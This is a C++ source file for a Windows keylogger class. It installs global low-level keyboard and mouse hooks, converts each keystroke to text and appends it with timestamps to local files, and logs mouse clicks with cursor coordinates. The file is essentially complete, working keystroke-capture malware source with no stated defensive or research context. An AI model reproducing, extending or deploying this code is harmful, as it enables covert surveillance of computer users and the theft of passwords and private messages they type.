#include "Keylogger.h"

Keylogger* Keylogger::instance = nullptr;

Keylogger::Keylogger() {
    instance = this;
    logFile.open("log.csv", std::ios::app);
    keyboardFile.open("linear_keyboard.txt", std::ios::app);
    logFile << "Time,Event,Type,Key/Position,MousePosition\n";
    keyboardFile << "Every word typed by computer:\n";
}

Keylogger::~Keylogger() {
    logFile.close();
    keyboardFile.close();
    UnhookWindowsHookEx(keyboardHook);
    UnhookWindowsHookEx(mouseHook);
}

void Keylogger::StartLogging() {
    SetKeyboardHook();
    SetMouseHook();

    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

void Keylogger::StopLogging() {
    UnhookWindowsHookEx(keyboardHook);
    UnhookWindowsHookEx(mouseHook);
}

void Keylogger::SetKeyboardHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
}

void Keylogger::SetMouseHook() {
    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, NULL, 0);
}

LRESULT CALLBACK Keylogger::KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        instance->LogKeyboardEvent((PKBDLLHOOKSTRUCT)lParam);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK Keylogger::MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN)) {
        instance->LogMouseEvent(wParam);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void Keylogger::LogKeyboardEvent(PKBDLLHOOKSTRUCT p) {
    auto time_now = std::chrono::system_clock::now();
    auto timestamp = std::chrono::system_clock::to_time_t(time_now);
    std::string key;

    switch (p->vkCode) {
    case VK_RETURN:
        key = " ( typed Enter )\n";
        break;
    case VK_SPACE:
        key = " ( typed Space ) ";
        break;
    case VK_SHIFT:
        key = " ( typed Shift ) ";
        break;
    case VK_BACK:
        key = " ( typed Backspace ) ";
        break;
    case VK_TAB:
        key = " ( typed Tab ) ";
        break;
    case VK_ESCAPE:
        key = " ( typed Escape ) ";
        break;
    case VK_CAPITAL:
        key = " ( typed Caps Lock ) ";
        break;
    case VK_LCONTROL:
    case VK_RCONTROL:
        key = " ( typed Control ) ";
        break;
    case VK_LMENU:
    case VK_RMENU:
        key = " ( typed Alt ) ";
        break;
    case VK_LWIN:
    case VK_RWIN:
        key = " ( typed Windows Key ) ";
        break;
    case VK_OEM_1:
        key = " ( typed ; ) ";
        break;
    case VK_OEM_2:
        key = " ( typed ? ) ";
        break;
    case VK_OEM_3:
        key = " ( typed ~ ) ";
        break;
    case VK_OEM_4:
        key = " ( typed [ ) ";
        break;
    case VK_OEM_5:
        key = " ( typed | ) ";
        break;
    case VK_OEM_6:
        key = " ( typed ] ) ";
        break;
    case VK_OEM_7:
        key = " ( typed ' ) ";
        break;
    case VK_OEM_COMMA:
        key = " ( typed , ) ";
        break;
    case VK_OEM_PERIOD:
        key = " ( typed . ) ";
        break;
    case VK_OEM_MINUS:
        key = " ( typed - ) ";
        break;
    case VK_OEM_PLUS:
        key = " ( typed + ) ";
        break;
    case VK_OEM_8:
        key = " ( typed ` ) ";
        break;
    case VK_OEM_102:
        key = " ( typed < ) ";
        break;
    case VK_INSERT:
        key = " ( typed Insert ) ";
        break;
    case VK_DELETE:
        key = " ( typed Delete ) ";
        break;
    case VK_HOME:
        key = " ( typed Home ) ";
        break;
    case VK_END:
        key = " ( typed End ) ";
        break;
    case VK_PRIOR:
        key = " ( typed Page Up ) ";
        break;
    case VK_NEXT:
        key = " ( typed Page Down ) ";
        break;
    case VK_NUMPAD0:
    case VK_NUMPAD1:
    case VK_NUMPAD2:
    case VK_NUMPAD3:
    case VK_NUMPAD4:
    case VK_NUMPAD5:
    case VK_NUMPAD6:
    case VK_NUMPAD7:
    case VK_NUMPAD8:
    case VK_NUMPAD9:
        key = " ( typed Num Pad ";
        if (p->vkCode >= VK_NUMPAD0 && p->vkCode <= VK_NUMPAD9) {
            key += static_cast<char>(p->vkCode - VK_NUMPAD0 + '0');
        }
        else {
            key += static_cast<char>(p->vkCode);
        }
        key += " ) ";
        break;
    case VK_MULTIPLY:
        key = " ( typed * ) ";
        break;
    case VK_ADD:
        key = " ( typed + ) ";
        break;
    case VK_SUBTRACT:
        key = " ( typed - ) ";
        break;
    case VK_DECIMAL:
        key = " ( typed . ) ";
        break;
    case VK_DIVIDE:
        key = " ( typed / ) ";
        break;
    case VK_F1:
    case VK_F2:
    case VK_F3:
    case VK_F4:
    case VK_F5:
    case VK_F6:
    case VK_F7:
    case VK_F8:
    case VK_F9:
    case VK_F10:
    case VK_F11:
    case VK_F12:
        key = " ( typed F";
        key += static_cast<char>(p->vkCode - VK_F1 + '1');
        key += " ) ";
        break;
    default:
        key = static_cast<char>(tolower(p->vkCode));
        break;
    }

    std::tm timeinfo;
    localtime_s(&timeinfo, &timestamp);
    if (timeinfo.tm_sec % 30 == 0) {
        keyboardStream << "\n" << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ":" << key;
    }
    else {
        keyboardStream << key;
    }

    try {
        logStream << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ",Keyboard Key,Pressed," << key << ",0\n";

        logFile.open("log.csv", std::ios::app);
        if (!logFile.is_open()) {
            throw std::runtime_error("Failed to open log file.");
        }
        logFile << logStream.str();
        logFile.close();
        logStream.str("");

        keyboardFile.open("linear_keyboard.txt", std::ios::app);
        if (!keyboardFile.is_open()) {
            throw std::runtime_error("Failed to open keyboard file.");
        }
        keyboardFile << keyboardStream.str();
        keyboardFile.close();
        keyboardStream.str("");
    }
    catch (const std::exception&) {
        // Handle error
    }
}

void Keylogger::LogMouseEvent(WPARAM wParam) {
    try {
        auto time_now = std::chrono::system_clock::now();
        auto timestamp = std::chrono::system_clock::to_time_t(time_now);

        POINT p;
        if (!GetCursorPos(&p)) {
            throw std::runtime_error("Failed to get cursor position.");
        }
        std::string button;
        switch (wParam) {
        case WM_LBUTTONDOWN:
            button = "Left";
            break;
        case WM_RBUTTONDOWN:
            button = "Right";
            break;
        case WM_MBUTTONDOWN:
            button = "Middle";
            break;
        default:
            button = "Unknown";
            break;
        }

        std::tm timeinfo;
        localtime_s(&timeinfo, &timestamp);

        logStream << std::put_time(&timeinfo, "%Y-%m-%d %H:%M:%S") << ",Mouse Click," << button << "," << p.x << "," << p.y << "\n";

        logFile.open("log.csv", std::ios::app);
        if (!logFile.is_open()) {
            throw std::runtime_error("Failed to open log file.");
        }
        logFile << logStream.str();
        logFile.close();
        logStream.str("");
    }
    catch (const std::exception&) {
        // Handle error
    }
}

